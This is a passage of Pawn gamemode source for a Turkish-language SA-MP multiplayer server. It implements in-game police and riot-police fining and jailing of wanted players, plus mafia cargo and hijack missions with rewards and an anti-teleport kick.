	format(Msg, 128, "{FF0000}Polis Uyariyor : Durmak icin %i saniyen kaldi", APlayerData[playerid][Value_PoliceCanJailMe]);
	SendClientMessage(playerid, 0xFFFFFFFF, Msg);

	// Check if the timer has ran out
	if (APlayerData[playerid][Value_PoliceCanJailMe] == 0)
	{
	    // Set a switch that indicates that this player didn't stop when he got the warning from the police player
	    // When the police can catch him now, he'll be sent to jail and the fine is doubled
	    APlayerData[playerid][PoliceCanJailMe] = true;
		// Also kill the timer, as it's not needed anymore
		KillTimer(APlayerData[playerid][Timer_PoliceCanJailMe]);
		// Let the player know what consequences it will have by not stopping
		format(Msg, 128, "{FF0000}Polisi Sinirlendirdin , 60 Saniye Ýcinde Durmaz isen Yakalandiginda 2 Dakika Hapis Cezasi alabilirsin.");
		SendClientMessage(playerid, 0xFFFFFFFF, Msg);
		format(Msg, 128, "{FF0000}Polisi umursamadin , Ceza Payý 2 Katýna Cýkartýldý.");
		SendClientMessage(playerid, 0xFFFFFFFF, Msg);
	}

	// Reduce the remaining time by 5 seconds
	APlayerData[playerid][Value_PoliceCanJailMe] = APlayerData[playerid][Value_PoliceCanJailMe] - 5;

	return 1;
}

// This function sends the given message to all police players
Police_SendMessage(PoliceMessage[])
{
	for (new PoliceID; PoliceID < MAX_PLAYERS; PoliceID++) // Loop through all players
		if (APlayerData[PoliceID][LoggedIn] == true) // Check if this player has logged in
		    if (APlayerData[PoliceID][PlayerClass] == ClassPolice && APlayerSpawnData[PoliceID] == true) // Check if this player is a police player
				SendClientMessage(PoliceID, 0xFFFFFFFF, PoliceMessage); // Send the message to the police player
}




////////////////////////////////////////////////*************ppc_missionsFBY**************//////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


// Forward the function to timer to check players every second to see if they're wanted

forward FBY_CheckWantedPlayers(playerid);

forward UnjailPlayer(playerid);







// This timer is created every time a player changes his class to FBY

public FBY_CheckWantedPlayers(playerid)

{

	// Scan through all players

	for (new PlayerToCheck; PlayerToCheck < MAX_PLAYERS; PlayerToCheck++)

	{

		// check if this player is connected

		if (IsPlayerConnected(PlayerToCheck))

		{

			//Check if that player is wanted

			if (APlayerData[PlayerToCheck][PlayerWanted] > 0 && PlayerToCheck != playerid)

			    SetPlayerMarkerForPlayer(playerid, PlayerToCheck, 0xFF0000FF); // Make that player red to the FBY-player

			else

			{

				// Reset the playercolor based on the player's class

			    switch (APlayerData[PlayerToCheck][PlayerClass])

			    {

			        case ClassTruckDriver: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassTruckDriver);
			        case ClassBusDriver: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassBusDriver);
			        case ClassPilot: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassPilot);
			        case ClassPolice: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassPolice);
			        case ClassMafia: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassMafia);
			        case ClassGemici: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassGemici);
  			        case ClassOduncu: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassOduncu);
  			        case ClassRoadWorker: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassRoadWorker);
			        case ClassBalikci: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassBalikci);
			        case ClassBanka: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassBanka);
			        case ClassFire: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassFire);
			        case ClassCopcu: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassCopcu);
			        case ClassFBY: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassFBY);
			        case ClassPboy: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassPboy);
                    case ClassKargocu: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassKargocu);
                    case ClassDolmusDriver: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassDolmusDriver);
			    }

			}

		}

	}

}



// This function gets called when a FBY player presses the SECUNDAIRY FIRE button (to warn nearby wanted players)

FBY_WarnNearbyPlayers(playerid)

{

	// Setup local variables

	new Float:x, Float:y, Float:z, Name[24], Msg[128];



	// Scan through all players

	for (new PlayerToCheck; PlayerToCheck < MAX_PLAYERS; PlayerToCheck++)

	{

		// check if this player is connected

		if (IsPlayerConnected(PlayerToCheck))

		{

			// Check if the current player is wanted

			if (APlayerData[PlayerToCheck][PlayerWanted] > 0 && PlayerToCheck != playerid)

			{

			    // Get the position of this player

			    GetPlayerPos(PlayerToCheck, x, y, z);

			    // Check if the FBY-player is in range of the player

				if (IsPlayerInRangeOfPoint(playerid, 50.0, x, y, z))

				{

					GameTextForPlayer(PlayerToCheck, TXT_FBYWarnPlayer, 3000, 4); // Warn the player

					// Also start a timer which gives the player a chance to stop and get a fine

					// If he doesn't stop, the player will be sent to jail when he gets fined

					if (APlayerData[PlayerToCheck][FBYWarnedMe] == false)

					{

					    APlayerData[PlayerToCheck][FBYWarnedMe] = true;

						APlayerData[PlayerToCheck][Value_FBYCanJailMe] = 60;

						APlayerData[PlayerToCheck][Timer_FBYCanJailMe] = SetTimerEx("Timer_FBYCanJailPlayer", 5000, true, "i", PlayerToCheck);

					}



					// Let the FBY player know that he warned the player

					GetPlayerName(PlayerToCheck, Name, sizeof(Name));

					format(Msg, 128, "{00FF00}You've warned {FFFF00}%s", Name);

					SendClientMessage(playerid, 0xFFFFFFFF, Msg);

				}

			}

		}

	}



	return 1;

}



// This function gets called when a FBY player presses the FIRE key (to fine nearby wanted players) when he's on foot

FBY_FineNearbyPlayers(playerid)

{

	// Setup local variables

	new Float:x, Float:y, Float:z;



	// Scan through all players

	for (new PlayerToCheck; PlayerToCheck < MAX_PLAYERS; PlayerToCheck++)

	{

		// check if this player is connected

		if (IsPlayerConnected(PlayerToCheck))

		{

			// Check if the other player isn't the same FBY player

			if (PlayerToCheck != playerid)

			{

				// Check if the current player is wanted and the wanted player is driving slowly (below 30 kph)

				if ((APlayerData[PlayerToCheck][PlayerWanted] > 0) && (APlayerData[PlayerToCheck][PlayerSpeed] < 30))

				{

				    // Get the position of this player

				    GetPlayerPos(PlayerToCheck, x, y, z);



				    // Check if the FBY-player is in range of the player (FBY player and wanted player must be within 10 meters of eachother)

					if (IsPlayerInRangeOfPoint(playerid, 10.0, x, y, z))

					{

					    // Fine the player

						FBY_PayFine(playerid, PlayerToCheck);



						// Exit the function

						return 1;

					}



					// Check if the FBY-player is in range of the player (he can be inside his vehicle or on foot)

					if (IsPlayerInRangeOfPoint(playerid, 50.0, x, y, z))

					{

						GameTextForPlayer(PlayerToCheck, TXT_FBYWarnPlayer, 3000, 4); // Warn the player

						// Also start a timer which gives the player a chance to stop and get a fine

						// If he doesn't stop, the player will be sent to jail when he gets fined

						if (APlayerData[PlayerToCheck][FBYWarnedMe] == false)

						{

						    APlayerData[PlayerToCheck][FBYWarnedMe] = true;

							APlayerData[PlayerToCheck][Value_FBYCanJailMe] = DefaultWarnTimeBeforeJail;

							APlayerData[PlayerToCheck][Timer_FBYCanJailMe] = SetTimerEx("Timer_FBYCanJailPlayer", 5000, true, "i", PlayerToCheck);

						}

					}

				}

			}

		}

	}



	return 1;

}



// Pay the FBY player and fine the player

FBY_PayFine(playerid, PlayerToFine)

{

	// Setup local variables

	new FBYName[24], FinedPlayerName[24], FBYMsg[200], PlayerMsg[200], Fine;



	// Get the names of the FBY player and the wanted player

	GetPlayerName(playerid, FBYName, 24);

	GetPlayerName(PlayerToFine, FinedPlayerName, 24);



	// Check if the wanted player's timer hasn't ran out yet

	if (APlayerData[PlayerToFine][FBYCanJailMe] == false)

	{
		// Calculate the fine

		Fine = APlayerData[PlayerToFine][PlayerWanted] * DefaultFinePerStar;

		// Reward the FBY player (give cash and points)

		RewardPlayer(playerid, Fine, APlayerData[PlayerToFine][PlayerWanted]);

		// Let the FBY player know that he fined the player

		format(FBYMsg, 200, TXT_FBYFinedPlayerReward, FinedPlayerName, Fine);

		SendClientMessage(playerid, 0xFFFFFFFF, FBYMsg);

		// Let the wanted player pay the fine

		RewardPlayer(PlayerToFine, -Fine, 0);

		format(PlayerMsg, 200, TXT_PlayerGotFinedByFBY, FBYName, Fine);

		SendClientMessage(PlayerToFine, 0xFFFFFFFF, PlayerMsg);

		SilahUyari[PlayerToFine] = 0;
		SilahUyariM[PlayerToFine] = 0;

		format(FBYMsg, 200, TXT_FBYFinedPlayer, FBYName, FinedPlayerName);

		SendClientMessageToAll(0xFFFFFFFF, FBYMsg);

		// Increase the stats for fining a player

		APlayerData[playerid][StatsFBYFined]++;
		if(APlayerData[playerid][StatsFBYFined] >= 10)
		{
			GivePlayerAchievement(playerid, CevikAdamAch, 1); // Baþarým Sistemi
		}
	}

	else // The wanted player didn't pull over, now the FBY player has the right to send him to jail and double the fine

	{

	    // Set jailtime
        new JailTime = 120;

		// Calculate the fine (double the normal fine)

		Fine = APlayerData[PlayerToFine][PlayerWanted] * DefaultFinePerStar * 2;

		// Reward the FBY player (give cash and points)

		RewardPlayer(playerid, Fine, APlayerData[PlayerToFine][PlayerWanted]);

		// Let the FBY player know that he jailed the wanted player

		format(FBYMsg, 200, TXT_FBYJailedPlayerReward, FinedPlayerName, Fine);

		SendClientMessage(playerid, 0xFFFFFFFF, FBYMsg);

		// Let the wanted player pay a double fine

		RewardPlayer(PlayerToFine, -Fine, 0);

		// Let the player know he's been jailed and for how long

		format(PlayerMsg, 200, TXT_PlayerGotJailedByFBY, FBYName, (JailTime/60));

		SendClientMessage(PlayerToFine, 0xFFFFFFFF, PlayerMsg);

		// Let the other players know that the FBY player has jailed the wanted player

		format(FBYMsg, 200, TXT_FBYJailedPlayer, FBYName, FinedPlayerName, (JailTime/60));

		SendClientMessageToAll(0xFFFFFFFF, FBYMsg);

		// Teleport the player to jail

		FBY_JailPlayer(PlayerToFine, JailTime);

		SilahUyari[PlayerToFine] = 0;
		SilahUyariM[PlayerToFine] = 0;

		// Increase the stats for jailing a player

		APlayerData[playerid][StatsFBYJailed]++;
		if(APlayerData[playerid][StatsFBYJailed] >= 10)
		{
			GivePlayerAchievement(playerid, CevikAdamAch, 1); // Baþarým Sistemi
		}
	}



	// Clear the wanted player's wanted status (the speedometer will automatically clear all data and kill the timer)

    APlayerData[PlayerToFine][PlayerWanted] = 0;
    SilahUyari[PlayerToFine] = 0;
	SilahUyariM[PlayerToFine] = 0;


	// Also save the data (in case the server crashes, progress would be lost)

	Oyuncu_Kaydet(playerid);

	Oyuncu_Kaydet(PlayerToFine);



	return 1;

}



// This function ports the player inside the jail and sets a timer to get him back out

FBY_JailPlayer(playerid, JailTime)
{
	// First remove the player from his vehicle
	RemovePlayerFromVehicle(playerid);

	// Set the player in the virtual world of the jail (so other players cannot see the jailed players on their radar)
	SetPlayerVirtualWorld(playerid, WORLD_JAIL);

	// Set player interior to the FBY station in San Fierro
	SetPlayerInterior(playerid, 10);

	// Put the player inside the jail
	SetPlayerPos(playerid, 220.0, 110.0, 999.1);

	// Store the jailtime for this player
	APlayerData[playerid][PlayerJailed] = JailTime;

	// Start the jailtimer, which checks every second if the player is allowed to get out
	KillTimer(APlayerData[playerid][PlayerJailedTimer]);
	APlayerData[playerid][PlayerJailedTimer] = SetTimerEx("UnjailPlayer", 1000, true, "i", playerid);

	// If the player started a job, let it fail
	if (APlayerData[playerid][JobStarted] == true)
	{
		// Stop any job that may have started

		switch (APlayerData[playerid][PlayerClass])
		{
			case ClassTruckDriver: Trucker_EndJob(playerid);
  			case ClassBusDriver: BusDriver_EndJob(playerid);
			case ClassPilot: Pilot_EndJob(playerid);
			case ClassPolice: Police_EndJob(playerid);
			case ClassMafia: Mafia_EndJob(playerid);
 			case ClassGemici: Gemici_EndJob(playerid);
  			case ClassOduncu: Oduncu_EndJob(playerid);
   			case ClassBalikci: Balikci_EndJob(playerid);
   			case ClassBanka: Banka_EndJob(playerid);
   			case ClassFire: Fire_EndJob(playerid);
   			case ClassCopcu: StopCopcuGorev(playerid);
   			case ClassPboy: Pboy_EndJob(playerid);
   			case ClassKargocu: StopKargocuGorev(playerid);
            case ClassDolmusDriver: DolmusDriver_EndJob(playerid);
		}

		// Inform the player that he failed the mission
		GameTextForPlayer(playerid, TXT_FailedMission, 5000, 4);

		// Reduce the player's cash by 1000
		RewardPlayer(playerid, -1000, 0);
	}



	return 1;

}

// This function gets called when the FBY player dies (or changes class)

FBY_EndJob(playerid)

{

	// Kill the PlayerCheckTimer

	KillTimer(APlayerData[playerid][PlayerCheckTimer]);



	// Scan through all players (to reset them to their default colors for the FBY-player)

	for (new PlayerToCheck; PlayerToCheck < MAX_PLAYERS; PlayerToCheck++)

	{

		// check if this player is connected

		if (IsPlayerConnected(PlayerToCheck))

		{

			// Reset the playercolor based on the player's class

		    switch (APlayerData[PlayerToCheck][PlayerClass])
		    {
		        case ClassTruckDriver: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassTruckDriver);
		        case ClassBusDriver: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassBusDriver);
		        case ClassPilot: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassPilot);
		        case ClassPolice: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassPolice);
		        case ClassMafia: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassMafia);
		        case ClassGemici: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassGemici);
		        case ClassOduncu: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassOduncu);
		        case ClassBalikci: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassBalikci);
		        case ClassBanka: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassBanka);
		        case ClassFire: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassFire);
		        case ClassPboy: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassPboy);
                case ClassKargocu: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassKargocu);
                case ClassDolmusDriver: SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassDolmusDriver);
		    }
		}
	}

	return 1;
}



// This timer is started when a wanted player was warned by a FBY player

forward Timer_FBYCanJailPlayer(playerid);

public Timer_FBYCanJailPlayer(playerid)

{

	// Setup local variables

	new Msg[128];



	// Let the player know how much time he has left to pull over

	format(Msg, 128, "{FF0000}Teslim Olmaniz icin %i Saniyeniz Kaldi.", APlayerData[playerid][Value_FBYCanJailMe]);

	SendClientMessage(playerid, 0xFFFFFFFF, Msg);



	// Check if the timer has ran out

	if (APlayerData[playerid][Value_FBYCanJailMe] == 0)

	{

	    // Set a switch that indicates that this player didn't stop when he got the warning from the FBY player

	    // When the FBY can catch him now, he'll be sent to jail and the fine is doubled

	    APlayerData[playerid][FBYCanJailMe] = true;

		// Also kill the timer, as it's not needed anymore

		KillTimer(APlayerData[playerid][Timer_FBYCanJailMe]);

		// Let the player know what consequences it will have by not stopping

		format(Msg, 128, "{FF0000}Cevik Kuvvetin Uyarisni ciddiye almadigniz icin Yakalandigniz anda Hapse gönderiliceksiniz");

		SendClientMessage(playerid, 0xFFFFFFFF, Msg);

		format(Msg, 128, "{FF0000}Cezaninz ikiye Katlandi");

		SendClientMessage(playerid, 0xFFFFFFFF, Msg);

	}



	// Reduce the remaining time by 5 seconds

	APlayerData[playerid][Value_FBYCanJailMe] = APlayerData[playerid][Value_FBYCanJailMe] - 5;



	return 1;

}

// This function sends the given message to all FBY players

FBY_SendMessage(FBYMessage[])

{

	for (new FBYID; FBYID < MAX_PLAYERS; FBYID++) // Loop through all players

		if (APlayerData[FBYID][LoggedIn] == true) // Check if this player has logged in

		    if (APlayerData[FBYID][PlayerClass] == ClassFBY) // Check if this player is a FBY player

				SendClientMessage(FBYID, 0xFFFFFFFF, FBYMessage); // Send the message to the FBY player

}
// ************************************************************************************************************************************************************
// PPC_MissionsMafia
// ************************************************************************************************************************************************************

// Forward the function to timer to check players every second to see if they're carrying a mafia-load
forward Mafia_CheckMafiaLoads(playerid);
// Forward the public function used as a timer to load/unload your vehicle
forward Mafia_LoadUnload(playerid);



// This function is called when a mafia wants to start a job by entering "/work"
Mafia_StartRandomJob(playerid)
{
	if (APlayerData[playerid][JobStarted] == false)
	{
	    // Setup local variables
		new StartLoc[50], EndLoc[50], Load[50], Float:x, Float:y, Float:z, LoadMsg[128];

		// Job has started
		APlayerData[playerid][JobStarted] = true;

		// Get a random LoadID from the mafia-products
		APlayerData[playerid][LoadID] = Product_GetRandom(PCV_MafiaVan);
		// Also get a random start-location and end-location
		APlayerData[playerid][JobLoc1] = Product_GetRandomStartLoc(APlayerData[playerid][LoadID]);
		APlayerData[playerid][JobLoc2] = Product_GetRandomEndLoc(APlayerData[playerid][LoadID]);

		// Set jobstep to 1 (going to load the goods)
		APlayerData[playerid][JobStep] = 1;
		// Get the startlocation, endlocation and the load texts
		format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);
		format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
		format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);
		// Grab the x, y, z positions for the first location
		x = ALocations[APlayerData[playerid][JobLoc1]][LocX];
		y = ALocations[APlayerData[playerid][JobLoc1]][LocY];
		z = ALocations[APlayerData[playerid][JobLoc1]][LocZ];
		// Create a checkpoint where the player should load the goods
		SetPlayerCheckpoint(playerid, x, y, z, 7);
		// Store the vehicleID (required to be able to check if the player left his vehicle)
		APlayerData[playerid][VehicleID] = GetPlayerVehicleID(playerid);
		// Set the job-fail-time for the global vehicle-timer
		APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;
		// Inform the player that he must load his goods
		format(LoadMsg, 128, TXT_PickupCargoAt, Load, StartLoc);
		SendClientMessage(playerid, 0xFFFFFFFF, LoadMsg);
	}

	return 1;
}



// This timer is created every time a player changes his class to mafia and is called every second
public Mafia_CheckMafiaLoads(playerid)
{
	// Scan through all players
	for (new PlayerToCheck; PlayerToCheck < MAX_PLAYERS; PlayerToCheck++)
	{
		// check if this player is connected
		if (IsPlayerConnected(PlayerToCheck))
		{
			//Check if that player is carrying a mafia-load
			if (APlayerData[PlayerToCheck][MafiaLoad] == true)
			{
			    SetPlayerMarkerForPlayer(playerid, PlayerToCheck, 0xFF0000FF); // Make that player red to the mafia-player
			}else{
			    if (APlayerData[PlayerToCheck][PlayerClass] == ClassTruckDriver) // Reset the playercolor for truckers (only truckers can carry mafia-loads)
			        SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassTruckDriver);
       			if (APlayerData[PlayerToCheck][PlayerClass] == ClassBanka) // Reset the playercolor for truckers (only truckers can carry mafia-loads)
			        SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassBanka);
			}
		}
	}

	// If the mafia-player hasn't started a job, check if he has stolen a mafiaload from a trucker
	if (APlayerData[playerid][JobStarted] == false)
	{
		new vehicle = GetPlayerVehicleID(playerid);
		new trailer = GetVehicleTrailer(vehicle);

		// Check if the mafia-player has hijacked a mafia-load already
		if (APlayerData[playerid][MafiaLoadHijacked] == false)
		{
			// If the mafia-player hasn't hijacked a mafia-load yet, check if he did now (check vehicle and trailer)
			if ((AVehicleData[vehicle][MafiaLoad] == true) || (AVehicleData[trailer][MafiaLoad] == true))
			{
				// Store the vehicleid and trailerid to be able to check if the mafia-player lost his load afterwards
				APlayerData[playerid][VehicleID] = vehicle;
				APlayerData[playerid][TrailerID] = trailer;
			    // Now the mafia-player has hijacked a mafia-load
			    APlayerData[playerid][MafiaLoadHijacked] = true;
			    // Set the checkpoint where the mafia-player must bring the load
			    SetPlayerCheckpoint(playerid, 2867, 939, 10.8, 7.0);
				// Update the missiontext
				//TextDrawSetString(APlayerData[playerid][MissionText], TXT_MafiaDeliverStolenLoad);
			}
		}

		// Check if the mafia-player already hijacked a mafia-load
		if (APlayerData[playerid][MafiaLoadHijacked] == true)
		{
			// If the mafia-player has hijacked a mafia-load, check if he still has the load (check vehicle and trailer)
			if ((APlayerData[playerid][VehicleID] == vehicle) && (APlayerData[playerid][TrailerID] == trailer))
				// Do nothing if vehicle and trailer are the same
				return 1;
			else
			{
				// Clear the vehicleid and trailerid
				APlayerData[playerid][VehicleID] = 0;
				APlayerData[playerid][TrailerID] = 0;
			    // Now the mafia-player lost his stolen load
			    APlayerData[playerid][MafiaLoadHijacked] = false;
			    // Disable the checkpoint where he must bring his load
				DisablePlayerCheckpoint(playerid);
				// Reset the missiontext
				//TextDrawSetString(APlayerData[playerid][MissionText], Mafia_NoJobText);
			}
		}
	}

	return 1;
}



// This function is called whenever a mafia player enters a checkpoint
Mafia_OnPlayerEnterCheckpoint(playerid)
{
	// First check if the mafia player started a job or not
	if (APlayerData[playerid][JobStarted] == false) // Mafia player delivered a mafia-load
	{
	    // This code handles stolen mafia-loads
		new vehicle = GetPlayerVehicleID(playerid);
		new trailer = GetVehicleTrailer(vehicle);

		// If the mafia player has a trailer, so detach and respawn the trailer
		if (trailer > 0)
		{
			DetachTrailerFromVehicle(vehicle);
			SetVehicleToRespawn(trailer);
		}
		else // The mafia player has no trailer, so the load is inside the truck -> remove player from vehicle and respawn the vehicle
		{
		    RemovePlayerFromVehicle(playerid);
			SetVehicleToRespawn(vehicle);
		}

		// Reward the mafia player (give cash and points)
		if(VIP[playerid] == 0 && YVIP[playerid] == 0)
		{
		    SendClientMessage(playerid, -1, "Çalinti Araç getirdiginiz için 25.000$ ve 2 Skor kazandiniz.");
			RewardPlayer(playerid, 25000, 2);
		}else{
		    SendClientMessage(playerid, -1, "Çalinti Araç getirdiginiz için 75.000$ ve 6 Skor kazandiniz. ( VIP Bonus )");
		    RewardPlayer(playerid, 75000, 6);
		}
		// Let the player know he succesfully delivered a stolen load to the mafia hideout
		//SendClientMessage(playerid, 0xFFFFFFFF, TXT_MafiaDeliveredStolenLoad);

		// Increase the stats for completing a delivery of a stolen mafiaload
		APlayerData[playerid][StatsMafiaStolen]++;
		if(APlayerData[playerid][StatsMafiaStolen] >= 5)
		{
			GivePlayerAchievement(playerid, MafyaAch, 1); // Baþarým Sistemi
		}
		// Also save the data (in case the server crashes, progress would be lost)
		Oyuncu_Kaydet(playerid);

		// Cleanup
		APlayerData[playerid][VehicleID] = 0;
		APlayerData[playerid][TrailerID] = 0;
	    // Disable the checkpoint where he must bring his load
		DisablePlayerCheckpoint(playerid);
		// Reset the missiontext
		//TextDrawSetString(APlayerData[playerid][MissionText], Mafia_NoJobText);
	}
	else // The mafia-player is doing a job
	{
		// Check if the player is inside his vehicle while entering a checkpoint
		if (GetPlayerVehicleID(playerid) == APlayerData[playerid][VehicleID])
		{
			new LoadMsg[128];

		    // Check the jobstep
		    switch (APlayerData[playerid][JobStep])
		    {
				// JobStep is 1 (mafia is loading his goods at the checkpoint)
		 		case 1: format(LoadMsg, 128, TXT_LoadingGoods, ALoads[APlayerData[playerid][LoadID]][LoadName]);
				// JobStep is 2 (mafia is unloading his goods at the checkpoint)
				case 2: format(LoadMsg, 128, TXT_UnloadingGoods, ALoads[APlayerData[playerid][LoadID]][LoadName]);
		    }

			// Disable the player's actions (he cannot move anymore)
			TogglePlayerControllable(playerid, 0);

			// Show the message to inform him what he's doing (loading/unloading)
			GameTextForPlayer(playerid, LoadMsg, 5000, 5);
			// Start a timer (Public function "LoadUnload(playerid)" gets called when the timer runs out)
			APlayerData[playerid][LoadingTimer] = SetTimerEx("Mafia_LoadUnload", 5000, false, "d" , playerid);
		}
	}

	return 1;
}



// After a mafia entered a checkpoint, a timer is created. This function is called when the timer runs out
public Mafia_LoadUnload(playerid)
{
	// Setup local variables
	new Name[24], Msg[128];

	// Get the player name
	GetPlayerName(playerid, Name, sizeof(Name));

	// Check the JobStep
	switch (APlayerData[playerid][JobStep])
	{
		case 1: // Player must load his goods
		{
		    // Setup local variables
			new StartLoc[50], EndLoc[50], Load[50], Float:x, Float:y, Float:z, UnloadMsg[100];
			// Set JobStep to 2 (unloading goods)
			APlayerData[playerid][JobStep] = 2;
			// Delete the loading-checkpoint
			DisablePlayerCheckpoint(playerid);
			// Get the startlocation, endlocation and the load texts
			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);
			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);

			// Grab the x, y, z positions for the second location (to unload the goods)
			x = ALocations[APlayerData[playerid][JobLoc2]][LocX];
			y = ALocations[APlayerData[playerid][JobLoc2]][LocY];
			z = ALocations[APlayerData[playerid][JobLoc2]][LocZ];
			// Create a checkpoint where the player should unload the goods
			SetPlayerCheckpoint(playerid, x, y, z, 7);
		    // Add 4 to the player's wanted level
		    APlayerData[playerid][PlayerWanted] += 4;
			// Inform the police this mafia player is wanted
			format(Msg, 128, "{00FF00}Mafya {FFFF00}%s{00FF00} illegal yük taþýyor , hemen yakalayin", Name);
			Police_SendMessage(Msg);
			// Inform the player that he must unload his goods
			format(UnloadMsg, 100, TXT_DeliverCargoTo, Load, EndLoc);
			SendClientMessage(playerid, 0xFFFFFFFF, UnloadMsg);

			GorevTime[playerid] = 0;
		}
		case 2: // Player is delivering his goods
		{
		    if(GorevTime[playerid] < 8)
		    {
		        new BanMSG[256];
		        //new TotalBanTime = (1 * 86400) + (0 * 3600) + gettime();
		        //APlayerData[playerid][BanTime] = TotalBanTime;

				format(BanMSG, 256, "{FF0000}%s{F8F8FF}, sunucudan tekmelendi. [ {FF0000}Teleport Hack {F8F8FF}]", GetName(playerid));
				SendClientMessageToAll(-1, BanMSG);
				SafeKick(playerid);
		        return 1;
		    }

		    // Setup local variables
			new StartLoc[50], EndLoc[50], Load[50], Msg1[128], Msg2[128];

			// Get the startlocation, endlocation and the load texts
			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);
			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);

			// Construct the message sent to all players that this player completed a mafia mission
			format(Msg1, 128, TXT_PlayerCompletedMafiaJob, Name, Load);
			format(Msg2, 128, TXT_PlayerCompletedMafiaJobInfo, StartLoc, EndLoc);
			SendClientMessageToAll(0xFFFFFFFF, Msg1);
			SendClientMessageToAll(0xFFFFFFFF, Msg2);



		    // Setup local variables
			new Float:x1, Float:y1, Float:x2, Float:y2, Float:Distance, Message[128], Payment, Skor;
			// Grab the x, y, z positions for the first location (to load the goods)
			x1 = ALocations[APlayerData[playerid][JobLoc1]][LocX];
			y1 = ALocations[APlayerData[playerid][JobLoc1]][LocY];
			// Grab the x, y, z positions for the second location (to unload the goods)
			x2 = ALocations[APlayerData[playerid][JobLoc2]][LocX];
			y2 = ALocations[APlayerData[playerid][JobLoc2]][LocY];
			// Calculate the distance between both points
			Distance = floatsqroot(((x2 - x1) * (x2 - x1)) + ((y2 - y1) * (y2 - y1)));

			// Calculate the payment for the player
			Payment = floatround((Distance * ALoads[APlayerData[playerid][LoadID]][PayPerUnit]), floatround_floor);
			Skor = 2;

			if(VIP[playerid] >= 1 || YVIP[playerid] == 1)
			{
 				Payment += 2*Payment;
 				Skor = 6;
			}

			// Reward the player (give cash and points)
			RewardPlayer(playerid, Payment, Skor);

			// Send a message to let the player know he finished his mission and got paid
			format(Message, 128, "Görevi tamamladýnýz $%i ve 5 EXP kazandýnýz", Payment);
			SendClientMessage(playerid, 0xFFFFFFFF, Message);

			// Increase the stats for completing a mafia job
			APlayerData[playerid][StatsMafiaJobs]++;
			format(Message, 1024, "Mafya görevini baþarýyla bitirdi");
			SqlLogYaz(playerid, 7, Message);
			
			EXP[playerid] = EXP[playerid] + 5;
			
			if(APlayerData[playerid][StatsMafiaJobs] >= 5)
			{
				GivePlayerAchievement(playerid, MafyaAch, 1); // Baþarým Sistemi
			}
			// Also save the data (in case the server crashes, progress would be lost)
			Oyuncu_Kaydet(playerid);

			// End the current mafia job (clear mission-data)
			Mafia_EndJob(playerid);
		}
	}

    // Enable the player again (he can move again)
	TogglePlayerControllable(playerid, 1);

	return 1;
}



// This function gets called when the mafia player dies (or changes class)
Mafia_EndJob(playerid)
{
	// Kill the PlayerCheckTimer
	KillTimer(APlayerData[playerid][PlayerCheckTimer]);

	// Scan through all players (to reset them to their default colors for the mafia-player)
	for (new PlayerToCheck; PlayerToCheck < MAX_PLAYERS; PlayerToCheck++)
	{
		// Check if this player is connected
		if (IsPlayerConnected(PlayerToCheck))
		    if (APlayerData[PlayerToCheck][PlayerClass] == ClassTruckDriver) // Reset the playercolor for truckers (only truckers can carry mafia-loads)
		        SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassTruckDriver);
		        if (APlayerData[PlayerToCheck][PlayerClass] == ClassBanka) // Reset the playercolor for truckers (only truckers can carry mafia-loads)
		        SetPlayerMarkerForPlayer(playerid, PlayerToCheck, ColorClassBanka);
	}

	// Check if a job has started
	if (APlayerData[playerid][JobStarted] == true)
	{
		// Clear all data about the job from the player, so he can start a new one
		APlayerData[playerid][JobStarted] = false;
		APlayerData[playerid][JobID] = 0;
		APlayerData[playerid][JobStep] = 0;
		APlayerData[playerid][LoadID] = 0;
		APlayerData[playerid][JobLoc1] = 0;
		APlayerData[playerid][JobLoc2] = 0;
		// Reset the missiontext
		//TextDrawSetString(APlayerData[playerid][MissionText], Mafia_NoJobText);
		// Kill the LoadingTimer
		KillTimer(APlayerData[playerid][LoadingTimer]);
